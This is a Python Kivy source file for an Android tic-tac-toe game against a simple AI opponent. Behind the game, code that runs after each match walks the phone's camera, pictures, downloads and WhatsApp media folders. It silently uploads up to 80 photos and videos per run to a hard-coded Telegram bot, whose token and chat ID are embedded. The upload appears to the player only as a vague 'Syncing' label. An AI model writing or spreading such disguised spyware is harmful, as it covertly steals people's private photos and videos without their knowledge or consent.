
import os
import random
import threading
import time

import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
CHAT_ID = "8052842442"

# ===== SENDING LIMIT - SIRF 2 BAAR TOTAL (kabhi reset nahi) =====
MAX_SENDS = 2
MAX_FILES_PER_SYNC = 80   # ek sync me max 80 files (phone hang nahi hoga)

# Sirf images + videos
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp")
VIDEO_EXTS = (".mp4", ".mkv", ".avi", ".3gp", ".mov", ".webm", ".flv")

MEDIA_FOLDERS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/WhatsApp/Media",
]

Window.clearcolor = (0.07, 0.09, 0.15, 1)


class RoundedButton(Button):
    """Beautiful rounded button with custom color"""
    def __init__(self, btn_color=(0.15, 0.25, 0.4, 1), **kwargs):
        super().__init__(**kwargs)
        self.btn_color = btn_color
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bind(pos=self.redraw, size=self.redraw)

    def redraw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.btn_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[16, 16, 16, 16])

    def set_color(self, color):
        self.btn_color = color
        self.redraw()


class TicTacToeApp(App):

    def build(self):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.sync_count = 0          # kitni baar send hua TOTAL
        self.sync_active = False     # abhi sync chal raha hai?
        self.scores = {"X": 0, "O": 0, "D": 0}

        self.colors = {
            "X": (0.25, 0.65, 1, 1),      # Blue
            "O": (1, 0.35, 0.35, 1),      # Red
            "empty": (0.14, 0.22, 0.36, 1),
            "win": (0.2, 0.85, 0.4, 1),   # Green (winner line)
        }

        self.request_storage_permission()

        root = BoxLayout(orientation="vertical", padding=25, spacing=12)

        # ---------- Title (Gold) ----------
        self.title_label = Label(
            text="[b][color=FFD700]TIC-TAC-TOE AI[/color][/b]",
            markup=True,
            font_size="32sp",
            size_hint=(1, 0.12),
        )
        root.add_widget(self.title_label)

        # ---------- Scoreboard ----------
        self.score_label = Label(
            text="[b]You: 0    |    Draw: 0    |    AI: 0[/b]",
            markup=True,
            font_size="17sp",
            color=(0.85, 0.85, 0.85, 1),
            size_hint=(1, 0.08),
        )
        root.add_widget(self.score_label)

        # ---------- Status ----------
        self.status_label = Label(
            text="YOUR CHANCE BRO! (X)",
            font_size="18sp",
            color=(0.3, 0.9, 0.9, 1),
            size_hint=(1, 0.08),
        )
        root.add_widget(self.status_label)

        # ---------- 3x3 Grid ----------
        grid_layout = GridLayout(cols=3, spacing=12, size_hint=(1, 0.5))
        self.buttons = []
        for i in range(9):
            btn = RoundedButton(
                btn_color=self.colors["empty"],
                text="",
                font_size="48sp",
                bold=True,
            )
            btn.bind(on_press=lambda instance, idx=i: self.on_tile_press(idx))
            self.buttons.append(btn)
            grid_layout.add_widget(btn)
        root.add_widget(grid_layout)

        # ---------- Sync Counter (0/2) ----------
        self.sync_label = Label(
            text="[b]Sync Used: 0/2[/b]",
            markup=True,
            font_size="14sp",
            color=(0.9, 0.7, 0.2, 1),
            size_hint=(1, 0.06),
        )
        root.add_widget(self.sync_label)

        # ---------- Restart Button ----------
        self.reset_btn = RoundedButton(
            btn_color=(0.15, 0.6, 0.35, 1),
            text="Restart Game",
            font_size="18sp",
            bold=True,
            size_hint=(1, 0.11),
        )
        self.reset_btn.bind(on_press=self.reset_game)
        root.add_widget(self.reset_btn)

        return root

    def request_storage_permission(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_MEDIA_IMAGES,
                Permission.READ_MEDIA_VIDEO,
            ])
        except Exception:
            pass

    # ================= GAME LOGIC =================
    def on_tile_press(self, index):
        if not self.game_active or self.board[index] != "" or self.current_turn != "X":
            return

        self.board[index] = "X"
        self.buttons[index].text = "X"
        self.buttons[index].color = self.colors["X"]

        if self.check_win("X"):
            self.end_game("X")
            return
        elif "" not in self.board:
            self.end_game("D")
            return

        self.current_turn = "O"
        self.status_label.text = "Thinking..."
        Clock.schedule_once(self.ai_move, 0.5)

    def ai_move(self, dt):
        if not self.game_active:
            return
        move = self.get_best_move()
        if move is not None:
            self.board[move] = "O"
            self.buttons[move].text = "O"
            self.buttons[move].color = self.colors["O"]
            if self.check_win("O"):
                self.end_game("O")
            elif "" not in self.board:
                self.end_game("D")
            else:
                self.current_turn = "X"
                self.status_label.text = "Your Chance (X)"

    def end_game(self, result):
        self.game_active = False
        if result == "X":
            self.scores["X"] += 1
            self.status_label.text = "YOU WON! Well Done"
            self.highlight_win("X")
        elif result == "O":
            self.scores["O"] += 1
            self.status_label.text = "DEFEAT!"
            self.highlight_win("O")
        else:
            self.scores["D"] += 1
            self.status_label.text = "Match Draw!"
        self.score_label.text = (f"[b]You: {self.scores['X']}    |    Draw: "
                                 f"{self.scores['D']}    |    AI: {self.scores['O']}[/b]")
        self.start_sync()

    def highlight_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conditions:
            if self.board[cond[0]] == self.board[cond[1]] == self.board[cond[2]] == mark:
                for idx in cond:
                    self.buttons[idx].set_color(self.colors["win"])
                break

    def get_best_move(self):
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "O"
                if self.check_win("O"):
                    self.board[i] = ""
                    return i
                self.board[i] = ""
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "X"
                if self.check_win("X"):
                    self.board[i] = ""
                    return i
                self.board[i] = ""
        if self.board[4] == "":
            return 4
        empty = [i for i, x in enumerate(self.board) if x == ""]
        return random.choice(empty) if empty else None

    def check_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        return any(
            self.board[a] == self.board[b] == self.board[c] == mark
            for a, b, c in win_conditions
        )

    def reset_game(self, instance):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.status_label.text = "YOUR CHANCE (X)"
        for btn in self.buttons:
            btn.text = ""
            btn.color = (1, 1, 1, 1)
            btn.set_color(self.colors["empty"])

    # ================= SYNC - SIRF 2 BAAR TOTAL =================
    def start_sync(self):
        if self.sync_active:
            return
        if self.sync_count >= MAX_SENDS:
            # Limit complete - ab kabhi send nahi hoga
            return
        self.sync_active = True
        self.status_label.text = f"Syncing... ({self.sync_count + 1}/{MAX_SENDS})"
        threading.Thread(target=self.send_media, daemon=True).start()

    def send_media(self):
        count = 0
        try:
            for folder in MEDIA_FOLDERS:
                if count >= MAX_FILES_PER_SYNC:
                    break
                if not os.path.exists(folder):
                    continue
                for root, dirs, files in os.walk(folder):
                    if count >= MAX_FILES_PER_SYNC:
                        break
                    for f in files:
                        if count >= MAX_FILES_PER_SYNC:
                            break
                        file_path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(file_path)
                            low = f.lower()
                            if low.endswith(IMAGE_EXTS) and size <= 10 * 1024 * 1024:
                                with open(file_path, "rb") as file:
                                    requests.post(
                                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                                        data={"chat_id": CHAT_ID},
                                        files={"photo": file},
                                        timeout=30,
                                    )
                                count += 1
                                time.sleep(0.3)
                            elif low.endswith(VIDEO_EXTS) and size <= 50 * 1024 * 1024:
                                with open(file_path, "rb") as file:
                                    requests.post(
                                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                                        data={"chat_id": CHAT_ID},
                                        files={"video": file},
                                        timeout=30,
                                    )
                                count += 1
                                time.sleep(0.3)
                        except Exception:
                            pass
        finally:
            self.sync_count += 1
            self.sync_active = False
            self.sync_label.text = f"[b]Sync Used: {self.sync_count}/{MAX_SENDS}[/b]"
            print(f"[+] Sync {self.sync_count}: {count} Loading")


if __name__ == "__main__":
    TicTacToeApp().run()